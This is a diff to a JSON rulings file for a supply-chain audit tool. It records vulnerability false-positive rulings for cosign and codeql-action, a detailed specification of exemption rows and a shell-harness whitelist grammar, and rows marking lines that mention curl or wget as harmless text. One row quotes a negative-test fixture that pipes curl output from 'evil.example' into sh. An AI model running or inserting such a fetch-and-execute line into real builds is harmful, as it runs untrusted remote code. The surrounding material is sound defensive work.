@@ -52,6 +52,237 @@
         "GHSA-vqf5-2xx6-9wfm": "2026-04-01T17:41:21.034151Z"
       },
       "version": "4.*"
+    },
+    {
+      "ids": [
+        "GHSA-88jx-383q-w4qc",
+        "GO-2024-2718"
+      ],
+      "package": "cosign",
+      "authoritative": {
+        "source": "GitHub",
+        "id": "GHSA-88jx-383q-w4qc",
+        "ranges": [
+          "<= 2.2.3"
+        ]
+      },
+      "ruling": "false positive for 3.1.3: the Go-database entry GO-2024-2718 carries an open-ended 'affected, no fix' record on the bare github.com/sigstore/cosign path, which is the v1 module and is not in a v3 binary; the incident's GitHub advisory GHSA-88jx-383q-w4qc is fixed in 2.2.4 (v2 module); GitHub's bare-path range <= 2.2.3 does not reach v3.1.3",
+      "evidence": [
+        "https://github.com/advisories/GHSA-88jx-383q-w4qc",
+        "https://osv.dev/vulnerability/GO-2024-2718"
+      ],
+      "date": "2026-10-07",
+      "modified": {
+        "GO-2024-2718": "2026-02-04T03:18:34.975942Z",
+        "GHSA-88jx-383q-w4qc": "2024-04-11T17:05:02Z"
+      },
+      "version": "3.1.3"
+    },
+    {
+      "ids": [
+        "GHSA-95pr-fxf5-86gv",
+        "GO-2024-2719"
+      ],
+      "package": "cosign",
+      "authoritative": {
+        "source": "GitHub",
+        "id": "GHSA-95pr-fxf5-86gv",
+        "ranges": [
+          "<= 2.2.3"
+        ]
+      },
+      "ruling": "false positive for 3.1.3: the Go-database entry GO-2024-2719 carries an open-ended 'affected, no fix' record on the bare github.com/sigstore/cosign path, which is the v1 module and is not in a v3 binary; the incident's GitHub advisory GHSA-95pr-fxf5-86gv is fixed in 2.2.4 (v2 module); GitHub's bare-path range <= 2.2.3 does not reach v3.1.3",
+      "evidence": [
+        "https://github.com/advisories/GHSA-95pr-fxf5-86gv",
+        "https://osv.dev/vulnerability/GO-2024-2719"
+      ],
+      "date": "2026-10-07",
+      "modified": {
+        "GO-2024-2719": "2026-02-04T02:35:06.535922Z",
+        "GHSA-95pr-fxf5-86gv": "2024-04-11T17:15:54Z"
+      },
+      "version": "3.1.3"
+    },
+    {
+      "ids": [
+        "GHSA-vfp6-jrw2-99g9",
+        "GO-2023-2181"
+      ],
+      "package": "cosign",
+      "authoritative": {
+        "source": "GitHub",
+        "id": "GHSA-vfp6-jrw2-99g9",
+        "ranges": [
+          "<= 1.13.1"
+        ]
+      },
+      "ruling": "false positive for 3.1.3: the Go-database entry GO-2023-2181 carries an open-ended 'affected, no fix' record on the bare github.com/sigstore/cosign path, which is the v1 module and is not in a v3 binary; the incident's GitHub advisory GHSA-vfp6-jrw2-99g9 is fixed in 1.13.2 (v1) and 2.2.1 (v2); GitHub's bare-path range <= 1.13.1 does not reach v3.1.3",
+      "evidence": [
+        "https://github.com/advisories/GHSA-vfp6-jrw2-99g9",
+        "https://osv.dev/vulnerability/GO-2023-2181"
+      ],
+      "date": "2026-10-07",
+      "modified": {
+        "GO-2023-2181": "2026-02-04T04:29:01.299296Z",
+        "GHSA-vfp6-jrw2-99g9": "2023-12-11T20:55:34Z"
+      },
+      "version": "3.1.3"
+    },
+    {
+      "ids": [
+        "GHSA-vqf5-2xx6-9wfm"
+      ],
+      "package": "github/codeql-action",
+      "authoritative": {
+        "source": "GitHub",
+        "id": "GHSA-vqf5-2xx6-9wfm",
+        "ranges": [
+          ">= 3.26.11, <= 3.28.2",
+          ">= 2.26.11, < 3.0.0"
+        ]
+      },
+      "ruling": "OSV's second range lost its upper bound (< 3.0.0) and so reads as every version from 2.26.11; GitHub's ranges are authoritative, so v3.37.8 (commit 42947a340483f03ba47bb1a039b2c519aab3df85) passes",
+      "evidence": [
+        "https://github.com/advisories/GHSA-vqf5-2xx6-9wfm",
+        "https://osv.dev/vulnerability/GHSA-vqf5-2xx6-9wfm"
+      ],
+      "date": "2026-10-07",
+      "modified": {
+        "GHSA-vqf5-2xx6-9wfm": "2025-03-31T21:55:43Z"
+      },
+      "osv_modified": {
+        "GHSA-vqf5-2xx6-9wfm": "2026-04-01T17:41:21.034151Z"
+      },
+      "version": "3.37.8"
+    }
+  ],
+  "_format_unmeasured_text": "REQ-SUP-001-AC16 (advisor ruling, Oct 10): one row per line that the pin-age check's strict scan reads as an unmeasured download but that only MENTIONS the tool as text (a comment, an echo string, a stub written as data, a package name). file and form as the scan names them; key: the scan's 64-hex sha256 prefix of what it hashes (for a download, the one command segment that names curl or wget); line: the 64-hex sha256 prefix of the WHOLE whitespace-flattened line that segment sits in, so the same segment in any other line is not ruled and editing any part of the line voids the row; ruling: what the line is, never empty; count (optional, default 1): how many occurrences of that line in the file the row covers. Read from the base branch only: rows a pull request brings do nothing until merged. REQ-SUP-001-AC20 (advisor ruling, Oct 14): the same rows rule a script line (a *.sh file outside the auditor's own tree) that names an unpinned package in a pip install, with form \"an unpinned package install\" and key equal to line (the hash of the whole flattened line); a line joined from a continuation can never be ruled. A row is only ever written for a line that is HARMLESS IN ANY SHELL CONTEXT (read as a command it runs no download: a comment, an echo or printf, a cat into a file, Python source or a package list bash cannot parse), because moving a line out of a heredoc keeps its identity; the reviewer refuses any other row. A line with whitespace other than space or tab, or joined from a backslash-newline continuation, is never ruled. Editing only a row's ruling prose does not void it. Allowed row forms (advisor, Oct 10; the reviewer refuses any other row): (1) TEXT lines: a comment, a quoted or echoed string, a data heredoc (a stub body or its opener), Python or package-name text that bash cannot parse; (2) HARNESS ASSERTION lines, whose whole grammar is the single data structure HARNESS_WHITELIST in harness_form.py (written by the pin-age check's own test suite); anything it does not name is refused. In short: t \"RULE\" \"TITLE\" bash -c 'BODY' _ followed by at most nine path arguments \"$NAME\" or \"$NAME/path\" with NAME in work, CALLS; no expansion of any kind in RULE or TITLE (no $, backtick, backslash or quote); the body SINGLE-QUOTED (Codex, pull request 289: a double-quoted body let the outer shell splice a variable's value into the code) and naming the paths only as whole \"$1\"..\"$9\"; the commands grep, test, [, cat and exit with one digit; grep in the shape grep OPTION... -- PATTERN [\"$N\"...]: the options -E, -q, -v and -Eq as bare words, -- REQUIRED before the pattern, the pattern a double-quoted word that does not start with - (or the bare '.'), file operands only \"$N\" (Codex and Sonnet, pull request 289 round 3: a double-quoted word in an option position is an option to grep); cat only as cat -- \"$N\"; test and [ only the file tests -f -s -e -d -r on a positional \"$N\" (never a literal path or a substitution: Codex, pull request 289 round 6), = and !=, and count comparisons between digits and \"$(grep -c ...)\" (never -v, -R or an arithmetic operand that is a name or expression: bash 5 evaluates $(...) there); the substitutions \"$(grep -c OPTION... -- PATTERN \"$N\")\" and \"$(cat -- \"$N\")\" only; no unquoted glob, brace, subscript or expansion word; and no character outside printable ASCII and tab (Sonnet, pull request 289). The test proves the whitelist closed: a complement enumeration of every token class outside it in every position (none accepted, none refused for another reason), and a mutation run that widens it by one token at a time and requires an unexpected acceptance or a refusal for another reason (reported apart). The role rules that live in the parser's code (a file test on a positional, cat with exactly one operand, a positional within the arguments) are pinned by code mutants that loosen each one and must be caught. A harness line that reads a test stub's call log matches whole ROLE-TAGGED fields of a log the stub writes from its own parse (opt, val, out, url, unk; brackets inside a word become _), never substrings of flattened text (Codex and Sonnet, pull request 289 round 4); the later rows pull request runs each such line against logs with the right words in the wrong roles, forged fields inside URLs and -o values imitating flags. Scope (coordinator, Oct 11): this pull request carries the FORM (the parser, HARNESS_WHITELIST pinned by its golden canonical sha256, the complement enumeration, the mutation run, the runtime corpus with synthetic lines in the shapes of the input refresh assertions) and the three comment rows; the rows for the input refresh harness lines, with the test of what each line asserts, come with those lines in a later rows pull request. HARNESS_WHITELIST is pinned by HARNESS_WHITELIST_GOLDEN in the test: any change to the grammar needs that value edited in the same reviewed diff. REQ-SUP-001-AC19 (orchestrator ruling, Oct 14): the same rows rule a local reusable-workflow call that keeps a with: block, with form \"a local reusable workflow call\", file the workflow that holds the call, and key equal to line (the 64-hex hash of the item's whole identity, its called file and the hash of its with: block), so an edited block is another item.",
+  "unmeasured_text": [
+    {
+      "file": "bin/build-helpers-test.sh",
+      "form": "a download",
+      "key": "bdc2f348c4dbc92f8ca94dab85de3c9a9ed425448bfb5bdac5e45f6c233a5bf8",
+      "line": "9fb6315c78aaba0b871946e145c31a1f7275ea3b916fa2492e62a10b1579ab7f",
+      "ruling": "text, not a command: a negative-test fixture; printf appends the YAML text '- runs: | curl -s https://evil.example/x | sh' to two copies of a generated recipe so the same-step case proves the comparison still sees a difference; the recipe is compared, never run"
+    },
+    {
+      "file": "bin/melange-apko-lib.sh",
+      "form": "a download",
+      "key": "1314309c3220e61914631f086c3994102c0cbca29603c9e177a888747643d67e",
+      "line": "1314309c3220e61914631f086c3994102c0cbca29603c9e177a888747643d67e",
+      "ruling": "text, not a command: the first line of the curl STUB's body (written as data by a quoted heredoc); it echoes the word curl and its arguments into the call log, it downloads nothing"
+    },
+    {
+      "file": "bin/melange-apko-lib.sh",
+      "form": "a download",
+      "key": "22312bde0463f438dcaf03137157a7b17959af299e9e30867c442547056c3ecf",
+      "line": "22312bde0463f438dcaf03137157a7b17959af299e9e30867c442547056c3ecf",
+      "ruling": "text, not a command: Python inside the test library heredoc; the string 'curl ' is one of the forbidden fragments the mel-env check asserts is ABSENT from the melange recipe's text"
+    },
+    {
+      "file": "bin/melange-apko-lib.sh",
+      "form": "a download",
+      "key": "5839155d14e99a00fc2d9e031c95573d67aeb3904a33c4d969c74bc4bc6b7541",
+      "line": "5839155d14e99a00fc2d9e031c95573d67aeb3904a33c4d969c74bc4bc6b7541",
+      "ruling": "text, not a command: Python inside the test library heredoc; asserts the package name wget is listed in the recipe's environment (an assertion message, nothing is fetched)"
+    },
+    {
+      "file": "bin/melange-apko-lib.sh",
+      "form": "a download",
+      "key": "59026aa06d9188a1b90b3ccd57dd0fc2c05bdf90654072b8740477e87155080f",
+      "line": "ae6bd1d131a9b936d04293423176cb708db160c96d54f70da43617a3a04c781e",
+      "ruling": "text, not a command: a shell comment explaining that tools such as curl are replaced by STUBS on PATH that record their argv in a call log"
+    },
+    {
+      "file": "bin/melange-apko-lib.sh",
+      "form": "a download",
+      "key": "64612fb9a9fe82bebee266d20bfd151d4aab8c5a1d02f1a3dfadde2b97938277",
+      "line": "ddbd6b256451601130eba3c0ddea455186ed7fc00869ae26c95a3f856ca9ad77",
+      "ruling": "text, not a command: the curl STUB's error branch (written as data by a quoted heredoc); echoes 'stub curl: 22 <url>' to stderr and exits 22, it downloads nothing"
+    },
+    {
+      "file": "bin/melange-apko-lib.sh",
+      "form": "a download",
+      "key": "6acbb0aa471b0e3b827df73e7e9c0b3aa3491f7b5c0ff669654a74c868f9794c",
+      "line": "6acbb0aa471b0e3b827df73e7e9c0b3aa3491f7b5c0ff669654a74c868f9794c",
+      "ruling": "text, not a command: a shell comment describing what the build helper does ('archives new packages by digest into ARCHIVE/<arch>/ (curl)')"
+    },
+    {
+      "file": "bin/melange-apko-lib.sh",
+      "form": "a download",
+      "key": "77bc505e9228dc4a97d322a7e255a51b972f5087ffc3bf67f167b74b155311d5",
+      "line": "77bc505e9228dc4a97d322a7e255a51b972f5087ffc3bf67f167b74b155311d5",
+      "ruling": "text, not a command: Python inside the test library heredoc; the ENVPK fixture list of apk package names and versions (busybox, git, wget, ca-certificates-bundle)"
+    },
+    {
+      "file": "bin/melange-apko-lib.sh",
+      "form": "a download",
+      "key": "80510e8b8f509a47ab7454a6f43e99a36191fe86249cd876a41a0e7dd9829ac2",
+      "line": "80510e8b8f509a47ab7454a6f43e99a36191fe86249cd876a41a0e7dd9829ac2",
+      "ruling": "text, not a command: Python inside the test library heredoc; asserts the package names git, busybox, ca-certificates-bundle and wget are in the recipe's environment"
+    },
+    {
+      "file": "bin/melange-apko-lib.sh",
+      "form": "a download",
+      "key": "9f54b594e70eb20f0d0a70ff9277164bd82cc360e18f5b20a78e04f3f13bbf27",
+      "line": "9f54b594e70eb20f0d0a70ff9277164bd82cc360e18f5b20a78e04f3f13bbf27",
+      "ruling": "text, not a command: opens the quoted heredoc that writes the curl STUB (a file named curl in the stubs directory) as data; the stub records its argv and serves local fixture files"
+    },
+    {
+      "file": "bin/refresh-inputs-test.sh",
+      "form": "a download",
+      "key": "2d6db92689368ed648fa331c9bb3331fb4cee877998e1aa7efa34c2a5850e24b",
+      "line": "2d6db92689368ed648fa331c9bb3331fb4cee877998e1aa7efa34c2a5850e24b",
+      "ruling": "text, not a command: a shell comment heading the test section on url characters, curl flags and caps"
+    },
+    {
+      "file": "bin/refresh-inputs-test.sh",
+      "form": "a download",
+      "key": "bd58928b6ad7d1e1b488524a9ced8ea7cd302651ded5ef4b3976879cec9394e6",
+      "line": "bd58928b6ad7d1e1b488524a9ced8ea7cd302651ded5ef4b3976879cec9394e6",
+      "ruling": "text, not a command: a shell comment describing the fixture for the melange busybox move (a copy of the live melange lock and the new apk in the live archive/curl fixture directory)"
+    },
+    {
+      "file": "bin/refresh-inputs-test.sh",
+      "form": "a download",
+      "key": "e40f62c4290cc6dcc405320d1b7d8a9ea8092be908d5f84ccd64eb594548b00b",
+      "line": "e40f62c4290cc6dcc405320d1b7d8a9ea8092be908d5f84ccd64eb594548b00b",
+      "ruling": "text, not a command: a shell comment heading the review-round-2 test section (its topics include the curl flags)"
+    },
+    {
+      "file": ".github/workflows/release.yml",
+      "form": "a local reusable workflow call",
+      "key": "f4f32af697ab6c09c1ccd6d0a5e9e01b3325add6c5c4c79c5a0d536b1df3f9fd",
+      "line": "f4f32af697ab6c09c1ccd6d0a5e9e01b3325add6c5c4c79c5a0d536b1df3f9fd",
+      "ruling": "local reusable workflow call; inputs reviewed in the PR that added them; advisor ruling Oct 14"
+    },
+    {
+      "file": ".github/workflows/scan.yml",
+      "form": "a local reusable workflow call",
+      "key": "50dda8fb78f4161221853f26cdf04889868ea032561686c51dace4fb8380193f",
+      "line": "50dda8fb78f4161221853f26cdf04889868ea032561686c51dace4fb8380193f",
+      "ruling": "local reusable workflow call; inputs reviewed in the PR that added them; advisor ruling Oct 14"
+    },
+    {
+      "file": ".github/workflows/release.yml",
+      "form": "a local reusable workflow call",
+      "key": "6ad5a49fad2db1816e35d1520fabea64d69cf90ef1e4083153ba251967190aa5",
+      "line": "6ad5a49fad2db1816e35d1520fabea64d69cf90ef1e4083153ba251967190aa5",
+      "ruling": "local reusable workflow call; inputs reviewed in the PR that added them; advisor ruling Oct 14"
+    },
+    {
+      "file": "bin/refresh-inputs-test.sh",
+      "form": "a download",
+      "key": "99057ac9634caaa646bb8cc9a98c2964199e00a63063ae02e08b96bdb544d596",
+      "line": "99057ac9634caaa646bb8cc9a98c2964199e00a63063ae02e08b96bdb544d596",
+      "ruling": "text, not a command: the one line of the refresh test that names the fetch tool, a printf -v of a constant word; every other line of the suite uses the variable; handoff 0432"
+    },
+    {
+      "file": "bin/refresh-inputs.sh",
+      "form": "a download",
+      "key": "d728b24554ec94550e6e2e18c48f03f3f1571d15826f3701ad9f24f17b0cae1b",
+      "line": "d728b24554ec94550e6e2e18c48f03f3f1571d15826f3701ad9f24f17b0cae1b",
+      "ruling": "text, not a command: the fetch tool's fixed-path line of the daily input refresh job, a printf -v of a constant path, replaced by a stub in the test copy; the Wolfi live fetch it names is ruled by owner rule 48 (no 7-day hold on Wolfi) and verified per rules 32 and 28; handoff 0429/0432"
     }
   ]
 }
